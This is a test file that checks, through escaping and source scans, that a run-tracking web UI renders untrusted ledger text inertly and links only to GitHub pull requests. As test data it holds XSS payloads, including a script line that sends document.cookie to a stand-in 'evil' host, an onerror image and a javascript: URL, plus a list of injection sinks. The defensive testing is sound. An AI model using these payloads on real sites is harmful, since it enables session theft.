/**
 * What the run list, a run's view and its timeline do with text that is written to be believed: a goal, a summary, a finding,
 * a ruling, a note, a URL and a title that are HTML, scripts, links and quotes. The components are compiled for the test
 * (esbuild, against the tiny JSX runtime in `jsx-lite/`, judge's) and rendered the way a browser would show them: a string
 * child is text and an attribute is an attribute, and nothing a ledger line says becomes an element, a link or a handler.
 *
 * What is checked is the structure of what the components make: the tags that appear are the ones they declare, none of them
 * has an attribute that runs or loads anything, the one link there is goes only where `prHref` allows, and every hostile
 * string appears escaped. The sources are scanned too, for the ways a component could take a string for markup.
 */

import { readdirSync, readFileSync } from 'node:fs'
import { join } from 'node:path'
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { fileURLToPath } from 'node:url'
import { build } from 'esbuild'
import type { PageState } from '../src/client/controller.ts'
import type { LedgerLine, RunDetail, RunRow } from '../src/protocol.ts'
import { Fragment } from './jsx-lite/jsx-runtime.ts'
import type { Element } from './jsx-lite/jsx-runtime.ts'

const HERE = fileURLToPath(new URL('.', import.meta.url))
const CLIENT = join(HERE, '..', 'src', 'client')
/** The three components that show what a ledger and a record hold. */
const VIEWS = ['RunList.tsx', 'RunView.tsx', 'Timeline.tsx']

// --- compiling and rendering ---------------------------------------------------------------------

type Timeline = PageState['timeline']

interface Views {
  RunList: (props: { rows: RunRow[], now: number, select(project: string, id: string): void }) => Element
  RunView: (props: { detail: RunDetail, timeline: Timeline, now: number, back(): void, loadOlder(): void }) => Element
  Timeline: (props: { timeline: Timeline, now: number, loadOlder(): void }) => Element
}

let compiled: Promise<Views> | undefined

/** The three components, compiled against the test runtime, with what they import (plain TypeScript) bundled in. */
function components(): Promise<Views> {
  compiled ??= (async () => {
    const result = await build({
      stdin: {
        contents: VIEWS.map(file => `export * from './${file}'`).join('\n'),
        resolveDir: CLIENT,
        sourcefile: 'views.ts',
        loader: 'ts',
      },
      bundle: true,
      write: false,
      format: 'esm',
      platform: 'node',
      target: 'es2022',
      jsx: 'automatic',
      jsxImportSource: join(HERE, 'jsx-lite'),
      logLevel: 'silent',
    })
    const text = result.outputFiles[0]!.text
    return await import(`data:text/javascript;base64,${Buffer.from(text).toString('base64')}`) as Views
  })()
  return compiled
}

const VOID_TAGS = new Set(['br', 'hr', 'img', 'input', 'meta', 'link', 'source', 'wbr'])

/** Text as a browser shows it: what is markup in it is escaped, so it can only be read as characters. */
function escape(text: string): string {
  return text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;')
}

/** Render an element tree to HTML text. A string is text; a component is called; a prop that is `dangerouslySetInnerHTML` is refused. */
function render(node: unknown): string {
  if (node === null || node === undefined || typeof node === 'boolean') return ''
  if (typeof node === 'string' || typeof node === 'number') return escape(String(node))
  if (Array.isArray(node)) return node.map(render).join('')
  if (typeof node !== 'object' || (node as Element).$$typeof !== 'jsx-lite.element') throw new Error(`cannot render ${typeof node}`)
  const { type, props } = node as Element
  if (typeof type === 'function') return render((type as (props: unknown) => unknown)(props))
  if (type === Fragment) return render(props.children)
  if (typeof type !== 'string' || !/^[a-z][a-z0-9]*$/.test(type)) throw new Error(`not a tag: ${String(type)}`)
  if ('dangerouslySetInnerHTML' in props) throw new Error('dangerouslySetInnerHTML')
  const attributes = Object.entries(props)
    .filter(([name, value]) => name !== 'children' && typeof value !== 'function' && value !== undefined && value !== null && (value !== false || name.startsWith('aria-')))
    .map(([name, value]) => ` ${name === 'className' ? 'class' : name}${value === true && !name.startsWith('aria-') ? '' : `="${escape(String(value))}"`}`)
    .join('')
  return VOID_TAGS.has(type) ? `<${type}${attributes}>` : `<${type}${attributes}>${render(props.children)}</${type}>`
}

/** The element props named `on…` anywhere in a tree, with the tag they are on. */
function handlers(node: unknown, found: Array<[string, string]> = []): Array<[string, string]> {
  if (Array.isArray(node)) {
    for (const item of node) handlers(item, found)
  } else if (typeof node === 'object' && node !== null && (node as Element).$$typeof === 'jsx-lite.element') {
    const { type, props } = node as Element
    if (typeof type === 'function') return handlers((type as (props: unknown) => unknown)(props), found)
    for (const [name, value] of Object.entries(props)) if (/^on[A-Z]/.test(name)) found.push([String(type), `${name}:${typeof value}`])
    handlers(props.children, found)
  }
  return found
}

/** Every element of a tree with its props, components called. */
function elements(node: unknown, found: Element[] = []): Element[] {
  if (Array.isArray(node)) {
    for (const item of node) elements(item, found)
  } else if (typeof node === 'object' && node !== null && (node as Element).$$typeof === 'jsx-lite.element') {
    const element = node as Element
    if (typeof element.type === 'function') return elements((element.type as (props: unknown) => unknown)(element.props), found)
    if (typeof element.type === 'string') found.push(element)
    elements(element.props.children, found)
  }
  return found
}

/** Every real tag in rendered HTML: text can't contain `<`, so what starts with it is an element. */
function tagsOf(html: string): string[] {
  return html.match(/<[^>]*>/g) ?? []
}

const ALLOWED_TAGS = new Set(['ul', 'ol', 'li', 'div', 'span', 'p', 'dl', 'dt', 'dd', 'code', 'button', 'h3', 'a'])
const ALLOWED_ATTRIBUTES = new Set(['class', 'title', 'role', 'aria-label', 'type'])
const LINK_ATTRIBUTES = new Set(['class', 'title', 'href', 'rel', 'target'])
/** The only links there may be: a GitHub pull request's page, as `prHref` accepts it. */
const PR_LINK = /^https:\/\/github\.com\/[A-Za-z0-9._-]+\/[A-Za-z0-9._-]+\/pull\/[1-9][0-9]*$/

/** The attributes of a real tag, read as a browser reads them: a name, and a value in double quotes that can hold anything but a quote. */
function attributesOf(tag: string): Array<[string, string | undefined]> {
  const found: Array<[string, string | undefined]> = []
  let rest = tag.replace(/^<\/?[a-zA-Z][a-zA-Z0-9]*/, '').replace(/\/?>$/, '')
  for (;;) {
    const match = /^\s+([^\s=/>"']+)(?:="([^"]*)")?/.exec(rest)
    if (match === null) break
    found.push([match[1]!, match[2]])
    rest = rest.slice(match[0].length)
  }
  assert.equal(rest.trim(), '', `something in a tag that is not an attribute: ${rest.slice(0, 80)}`)
  return found
}

/**
 * Assert that `html` is made only of the elements the views declare, with no attribute that loads or runs anything, and links
 * only to a pull request; and that each hostile string is there, escaped, and nowhere raw.
 */
function assertInert(html: string, hostile: string[]): void {
  for (const tag of tagsOf(html)) {
    const name = /^<\/?([a-zA-Z][a-zA-Z0-9]*)/.exec(tag)?.[1]
    assert.ok(name !== undefined && ALLOWED_TAGS.has(name), `an element the views do not declare: ${tag.slice(0, 80)}`)
    const attributes = attributesOf(tag)
    for (const [attribute] of attributes) {
      assert.ok((name === 'a' ? LINK_ATTRIBUTES : ALLOWED_ATTRIBUTES).has(attribute), `an attribute the views do not declare: ${attribute} in ${tag.slice(0, 80)}`)
    }
    if (name === 'a' && !tag.startsWith('</')) {
      const values = new Map(attributes)
      assert.match(values.get('href') ?? '', PR_LINK, `a link that is not a pull request's: ${tag}`)
      assert.equal(values.get('rel'), 'noopener noreferrer')
      assert.equal(values.get('target'), '_blank')
    }
  }
  for (const text of hostile) {
    assert.ok(!html.includes(text), `unescaped: ${text.slice(0, 60)}`)
    assert.ok(html.includes(escape(text)), `missing, escaped: ${text.slice(0, 60)}`)
  }
}

const NOW = Date.UTC(2026, 9, 3, 12)
const SHA = 'b'.repeat(40)

const IMG = '<img src=x onerror="alert(document.cookie)">'
const SCRIPT = '<script>fetch("//evil/"+document.cookie)</script>'
const LINK = '<a href="javascript:alert(1)">click</a>'
const BREAK_OUT = '"><img src=x onerror=alert(1)>'
const QUOTE = 'it\'s "quoted" & <b>bold</b>'
const JS_URL = 'javascript:alert(document.domain)'
const HOSTILE = [IMG, SCRIPT, LINK, BREAK_OUT, QUOTE]
const GOOD_PR = 'https://github.com/Acme/widget/pull/7'

function row(overrides: Partial<RunRow> = {}): RunRow {
  return { project: 'Acme/widget', id: '20261003-fix-login', slug: 'fix-login', goal: 'Fix it', state: 'open', driver: { session: 'session-1', since: NOW, live: true }, openedAt: NOW - 3_600_000, ...overrides }
}

function timeline(lines: LedgerLine[], overrides: Partial<Timeline> = {}): Timeline {
  return { load: 'ready', lines, skipped: 0, more: 'idle', capped: false, ...overrides }
}

function detail(overrides: Partial<RunDetail> = {}): RunDetail {
  return {
    ...row(), branch: 'dish/fix-login', worktree: '/work/Acme/widget/.worktrees/fix-login', base: 'origin/main', baseCommit: 'a'.repeat(40),
    summary: { tasks: [], rulings: [], deferred: [], notes: [] }, ...overrides,
  }
}

/** A detail with a hostile string in every place a person or a model wrote one, or GitHub did. */
function hostileDetail(): RunDetail {
  return detail({
    goal: `${IMG} ${SCRIPT}`,
    reason: LINK,
    state: 'abandoned',
    driver: null,
    closedAt: NOW,
    branch: BREAK_OUT,
    worktree: QUOTE,
    base: SCRIPT,
    plan: { path: IMG, commit: SHA },
    pr: { url: JS_URL, number: 7 },
    summary: {
      tasks: [
        {
          task: IMG, own: true, path: LINK, removed: false, rounds: 2,
          coder: { child: SCRIPT, at: NOW, ended: true, stopReason: BREAK_OUT, status: 'done', summary: `${QUOTE} ${LINK}` },
          gate: { child: SCRIPT, outcome: IMG, exitCode: 1, head: SHA, at: NOW, log: SCRIPT },
          verdict: { child: LINK, verdict: 'approved', head: SHA, final: true, at: NOW, findings: { blocking: 0, should_fix: 1, nit: 2 } },
        },
        { task: 'api', own: false, removed: true, rounds: 0, coder: { child: 'c9', at: NOW, ended: false } },
      ],
      finalReview: { child: BREAK_OUT, verdict: 'changes_requested', head: SHA, final: true, at: NOW, findings: { blocking: 1, should_fix: 0, nit: 0 } },
      rulings: [{ at: NOW, by: 'main', source: 'ruling', text: `${SCRIPT} — ${QUOTE}`, task: LINK }, { at: NOW, by: 'harness', source: 'pr', text: IMG }],
      deferred: [{ at: NOW, what: IMG, where: LINK, why: BREAK_OUT }],
      notes: [{ at: NOW, text: SCRIPT }],
      pr: {
        checked: { at: NOW, head: SHA, result: 'refused' },
        opened: { at: NOW, url: JS_URL, number: 7, head: SHA },
        updated: { at: NOW, url: GOOD_PR, number: 7, head: SHA },
        feedback: { at: NOW, number: 7, reviews: 3, comments: 4, failedChecks: null },
      },
    },
  })
}

/** Ledger lines with a hostile string wherever a line can hold one, oldest first. */
function hostileLines(): LedgerLine[] {
  return [
    { at: NOW - 5_000, run: '20261003-fix-login', kind: 'note', by: 'main', session: SCRIPT, fields: { text: `${IMG}\n${LINK}` } },
    { at: NOW - 4_000, run: '20261003-fix-login', kind: 'child.ended', by: 'harness', child: BREAK_OUT, task: QUOTE, fields: {
      role: 'reviewer', stopReason: SCRIPT, reportFile: IMG, head: SHA,
      report: { role: 'reviewer', turn: 1, at: NOW, verdict: 'changes_requested', head: SHA, summary: LINK,
        findings: [{ severity: 'blocking', file: IMG, line: 3, summary: SCRIPT, fix: BREAK_OUT }] },
    } },
    { at: NOW - 3_000, run: '20261003-fix-login', kind: 'pr.opened', by: 'harness', fields: { url: JS_URL, number: 7, head: SHA, branch: QUOTE } },
    { at: NOW - 2_000, run: '20261003-fix-login', kind: IMG, by: 'harness', cut: true, fields: { [SCRIPT]: LINK } },
    { at: NOW - 1_000, run: '20261003-fix-login', kind: 'ruling', by: 'main', fields: { what: IMG, why: QUOTE, costIfWrong: SCRIPT } },
  ]
}

// --- the tests -----------------------------------------------------------------------------------------

test('the run list shows every field as text, groups by project, and links only a pull request prHref accepts', async () => {
  const { RunList } = await components()
  const rows = [
    row({ goal: IMG, id: SCRIPT, project: QUOTE, reason: LINK, state: 'abandoned', driver: null, closedAt: NOW, pr: { url: JS_URL, number: 1 } }),
    row({ goal: BREAK_OUT, driver: { session: SCRIPT, since: NOW, live: false }, pr: { url: GOOD_PR, number: 7 } }),
    row({ id: '20261003-two', goal: 'Second', state: 'pr', driver: null, closedAt: NOW, pr: { url: 'http://github.com/Acme/widget/pull/8', number: 8 } }),
  ]
  const html = render(RunList({ rows, now: NOW, select: () => {} }))
  assertInert(html, [IMG, SCRIPT, BREAK_OUT, QUOTE])
  // One link, the good one; the others' PRs are shown as text.
  assert.equal(html.match(/<a /g)?.length, 1, html)
  assert.ok(html.includes(`<a class="dish-runs-pr" href="${GOOD_PR}" rel="noopener noreferrer" target="_blank">#7</a>`), html)
  assert.ok(html.includes('#1') && html.includes('#8'))
  assert.ok(!html.includes(`href="${escape(JS_URL)}"`))
  // Each group is headed by its project, in the order given.
  const headings = [...html.matchAll(/<h3[^>]*>([^<]*)<\/h3>/g)].map(match => match[1])
  assert.deepEqual(headings, [escape(QUOTE), 'Acme/widget'])
  for (const expected of ['no driver', 'driven by session &lt;script&gt;…', '(not live)', 'opened 1 h ago', 'closed just now', 'abandoned', 'PR']) {
    assert.ok(html.includes(expected), `${expected} in ${html}`)
  }
})

test('the run list says how a run starts when there is none', async () => {
  const { RunList } = await components()
  const html = render(RunList({ rows: [], now: NOW, select: () => {} }))
  assert.ok(html.includes('No runs yet. A run starts when the main agent calls'), html)
  assertInert(html, [])
})

test('a row is a button that selects that row\'s own run, and the buttons are the list\'s only handlers', async () => {
  const { RunList } = await components()
  const rows = [row(), row({ id: '20261003-two', project: 'Acme/gadget' })]
  const selected: string[] = []
  const tree = RunList({ rows, now: NOW, select: (project, id) => { selected.push(`${project}/${id}`) } })
  assert.deepEqual(handlers(tree), [['button', 'onClick:function'], ['button', 'onClick:function']])
  const buttons = elements(tree).filter(element => element.type === 'button')
  assert.equal(buttons.length, 2)
  for (const button of buttons) {
    assert.equal(button.props.type, 'button')
    ;(button.props.onClick as () => void)()
  }
  assert.deepEqual(selected, ['Acme/widget/20261003-fix-login', 'Acme/gadget/20261003-two'])
})

test('a run\'s view shows every fact, task, ruling, finding, note and URL as text', async () => {
  const { RunView } = await components()
  const html = render(RunView({ detail: hostileDetail(), timeline: timeline(hostileLines()), now: NOW, back: () => {}, loadOlder: () => {} }))
  assertInert(html, [...HOSTILE, `${IMG} ${SCRIPT}`])
  // A URL that isn't a pull request's is text, never a link.
  assert.ok(html.includes(JS_URL))
  // The update's URL is a pull request's: the one link. The opening's, and the record's, are text.
  assert.equal(html.match(/<a /g)?.length, 1, html)
  assert.ok(html.includes(`href="${GOOD_PR}"`))
  for (const expected of ['Back', 'Tasks', 'Final review', 'Pull request', 'Rulings', 'Deferred', 'Notes', 'Project', 'Branch', 'Worktree', 'Base', 'Plan', 'Driver', 'Opened', 'Closed', 'Reason',
    'the run&#39;s own worktree', 'removed', 'started, no end recorded', 'changes requested', '3 reviews', '4 comments', 'the checks couldn&#39;t be read', 'refused']) {
    assert.ok(html.includes(expected), `${expected} in ${html}`)
  }
  // A coder with no end recorded is never said to be running.
  assert.ok(!/running|at work/i.test(html), html)
})

test('a run\'s view with nothing in its ledger yet says so, plainly', async () => {
  const { RunView } = await components()
  const html = render(RunView({ detail: detail(), timeline: timeline([]), now: NOW, back: () => {}, loadOlder: () => {} }))
  assertInert(html, [])
  assert.ok(html.includes('None yet') || html.includes('none yet'), html)
  assert.ok(html.includes('driven by session session-…'), html)
  assert.ok(html.includes('(live)'), html)
})

test('the view\'s handlers are its Back button and the timeline\'s Load older, and each calls what it says', async () => {
  const { RunView } = await components()
  const called: string[] = []
  const tree = RunView({ detail: detail(), timeline: timeline([], { next: 'abc' }), now: NOW, back: () => { called.push('back') }, loadOlder: () => { called.push('older') } })
  assert.deepEqual(handlers(tree), [['button', 'onClick:function'], ['button', 'onClick:function']])
  for (const button of elements(tree).filter(element => element.type === 'button')) (button.props.onClick as () => void)()
  assert.deepEqual(called.sort(), ['back', 'older'])
})

test('the timeline: each entry\'s time, who wrote it, its words, its task and child, and (cut to fit); all as text', async () => {
  const { Timeline } = await components()
  const html = render(Timeline({ timeline: timeline(hostileLines()), now: NOW, loadOlder: () => {} }))
  assertInert(html, [IMG, SCRIPT, LINK, BREAK_OUT, QUOTE])
  assert.ok(html.includes(JS_URL))
  assert.equal(html.match(/<a /g), null, 'no link: the only URL here is not a pull request\'s')
  assert.equal(html.match(/<ol/g)?.length, 1)
  assert.equal(html.match(/<li/g)?.length, hostileLines().length)
  for (const expected of ['main agent', 'harness', '(cut to fit)', 'task', 'child', 'just now']) assert.ok(html.includes(expected), `${expected} in ${html}`)
  // Oldest first, as given.
  assert.ok(html.indexOf('Note') < html.indexOf('Ruling'))
  // The unknown kind's fields are shown as JSON text, escaped.
  assert.ok(html.includes(escape(JSON.stringify({ [SCRIPT]: LINK }))))
})

test('the timeline\'s head: Load older while there is a next, the cap, the skipped lines, and an older page that failed', async () => {
  const { Timeline } = await components()
  const plain = render(Timeline({ timeline: timeline([]), now: NOW, loadOlder: () => {} }))
  assert.ok(!plain.includes('Load older'))
  assert.ok(!plain.includes('aren&#39;t shown'))
  assert.ok(!plain.includes('skipped'))
  const full = render(Timeline({
    timeline: timeline(hostileLines(), { next: 'cursor', skipped: 3, capped: true, moreError: { text: IMG, detail: SCRIPT } }),
    now: NOW, loadOlder: () => {},
  }))
  assertInert(full, [IMG, SCRIPT])
  assert.ok(full.includes('Load older'))
  assert.ok(full.includes('Older entries aren&#39;t shown'))
  assert.ok(full.includes('3 unreadable lines skipped'))
  assert.ok(full.indexOf('Load older') < full.indexOf('<ol'))
  const loading = render(Timeline({ timeline: timeline([], { next: 'cursor', more: 'loading' }), now: NOW, loadOlder: () => {} }))
  assert.ok(loading.includes('Loading'))
})

// --- the sources ---------------------------------------------------------------------------------------

test('no source of the page builds markup from a string, loads or runs one, or takes one for a link but through prHref', () => {
  const files = readdirSync(CLIENT).filter(name => /\.(ts|tsx)$/.test(name))
  assert.ok(files.length >= 12, files.join(', '))
  const forbidden: Array<[RegExp, string]> = [
    [/dangerouslySetInnerHTML/, 'dangerouslySetInnerHTML'],
    [/\.innerHTML|\binnerHTML\b/, 'innerHTML'],
    [/\bouterHTML\b/, 'outerHTML'],
    [/insertAdjacentHTML/, 'insertAdjacentHTML'],
    [/document\.write/, 'document.write'],
    [/\bsrcDoc\b|\bsrcdoc\b/, 'srcdoc'],
    [/createContextualFragment|DOMParser/, 'a parser of markup'],
    [/\beval\s*\(|new Function\s*\(|setTimeout\s*\(\s*['"`]/, 'a string run as code'],
    [/javascript:/i, 'a javascript: URL'],
    [/\bsrc\s*=/, 'a source'],
    [/window\.open|location\s*=|location\.href/, 'a navigation'],
  ]
  for (const file of files) {
    const text = readFileSync(join(CLIENT, file), 'utf8')
    for (const [pattern, what] of forbidden) assert.ok(!pattern.test(text), `${file} has ${what}`)
    // The one link: `href={link}`, where `link` is prHref's answer, in RunList.tsx.
    const links = [...text.matchAll(/\bhref\s*=\s*\S*/g)].map(match => match[0])
    if (file === 'RunList.tsx') {
      assert.deepEqual(links, ['href={link}'], file)
      assert.match(text, /const link = prHref\(/)
    } else {
      assert.deepEqual(links, [], `${file} has a link`)
    }
  }
  // The three views are the strictest: no hooks, nothing from dsh, and no handler but a button's onClick.
  for (const file of VIEWS) {
    const text = readFileSync(join(CLIENT, file), 'utf8')
    assert.ok(!/from '@deepseek-ai/.test(text), `${file} imports nothing from dsh`)
    assert.ok(!/from '\.\/parts\.tsx'/.test(text), `${file} doesn't import parts.tsx (dsh's primitives)`)
    assert.ok(!/\buse[A-Z]\w*\(/.test(text), `${file} has no hook`)
    assert.deepEqual([...new Set([...text.matchAll(/\bon[A-Z]\w*=/g)].map(match => match[0]))], ['onClick='], file)
  }
})

test('the test\'s own renderer refuses what would be a way in, so the checks above mean something', () => {
  assert.throws(() => render({ $$typeof: 'jsx-lite.element', type: 'div', props: { dangerouslySetInnerHTML: { __html: IMG } }, key: undefined }), /dangerouslySetInnerHTML/)
  assert.throws(() => render({ $$typeof: 'jsx-lite.element', type: IMG, props: {}, key: undefined }), /not a tag/)
  assert.throws(() => assertInert('<img src=x>', []), /do not declare/)
  assert.throws(() => assertInert('<div onclick="x">', []), /do not declare/)
  assert.throws(() => assertInert('<a href="javascript:x" rel="noopener noreferrer" target="_blank">', []), /not a pull request/)
  assert.throws(() => assertInert(`<a href="${GOOD_PR}">`, []), /noopener/)
  assert.throws(() => assertInert('<span class="a">x</span>', ['<img>']), /missing, escaped/)
  assert.throws(() => assertInert('<span class="a">hello</span>', ['hello']), /unescaped/)
  assert.throws(() => assertInert('<span class="a" onclick="x">x</span>', []), /do not declare: onclick/)
  assert.equal(render('<b>x</b> & "q"'), '&lt;b&gt;x&lt;/b&gt; &amp; &quot;q&quot;')
})
